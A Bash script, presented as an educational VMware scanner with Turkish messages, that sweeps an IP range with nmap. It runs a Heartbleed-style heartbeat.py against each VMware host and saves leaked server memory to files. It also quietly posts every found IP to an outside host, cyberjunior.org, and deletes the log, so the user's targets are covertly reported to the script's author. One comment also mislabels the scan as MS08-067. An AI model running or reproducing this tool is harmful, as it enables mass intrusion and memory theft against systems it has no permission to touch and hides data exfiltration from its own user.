#!/bin/bash
##############################################
#
# VMware Server Scanner by Serhatgksu
# Just made this for educational usage
# This script tested at Kali and Parrot
# For questions, comments or request :
# Telegram @serhatgksu
# 
##############################################


function print() {
    text="$1"
    color="$2"
    if [ "$color" == "gray" ]; then
        header="\e[38;5;250m"
    elif [ "$color" == "red" ]; then
        header="\e[91m"
    elif [ "$color" == "green" ]; then
        header="\e[92m"
    elif [ "$color" == "yellow" ]; then
        header="\e[93m"
    fi
    tail="\e[0m"
    echo -en $header$text$tail
}

if [ $UID -ne 0 ]; then
    echo -e "\\e[91mProgramı root haklarıyla çalıştırmalısınız!\033[m" 
    sleep 3
 	exit
    fi

ip1=( $(echo "$1" | sed 's/\./ /g') )
ip2=( $(echo "$2" | sed 's/\./ /g') )

print "VMware Sunucu IP'leri hangi isimle kayıt edilsin?\n" "red" 
print "Dosya adı = " "red" 
read VMwareServers

echo -e "
\033[31m#######################################################\033[m
                VMWARE SUNUCULAR TARANIYOR
\033[31m#######################################################\033[m"

for i in $(seq ${ip1[0]} ${ip2[0]})

 do

  for j in $(seq ${ip1[1]} ${ip2[1]})

   do

    for k in $(seq ${ip1[2]} ${ip2[2]})

     do

      for l in $(seq ${ip1[3]} ${ip2[3]})

       do
       	#### MS08-067 NMAP TARAMASI
       	nmap -sV -p 80,443 $i.$j.$k.$l > SCANFILE.txt
		CHECK=$(cat SCANFILE.txt | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}') 
       	### ZAFİYETLİ SUNUCU KONTROLÜ
       	if [[ $CHECK != "" ]]; then
			echo $i.$j.$k.$l >> $VMwareServers.txt 
              CHECKSH=$(python heartbeat.py $i.$j.$k.$l -p 443 | grep vulnerable! | cut -d: -f2 | awk '{ print $1}')
              	if [[ $CHECKSH != "" ]]; then
              		python heartbeat.py $i.$j.$k.$l -p 443 -n 50 > $i.$j.$k.$l.data.txt
              	fi
			  curl -s --data "i=$i.$j.$k.$l&t=VMware" http://cyberjunior.org/scanners/s.php >> .logs 
			  rm .logs
     
		fi		
		rm SCANFILE.txt
    
       done
      
     done

   done

done


echo -e "
\033[31m#######################################################\033[m
          İŞLEM TAMAMLANDI ÇIKIŞ YAPILIYOR...
\033[31m#######################################################\033[m"

sleep 3
exit
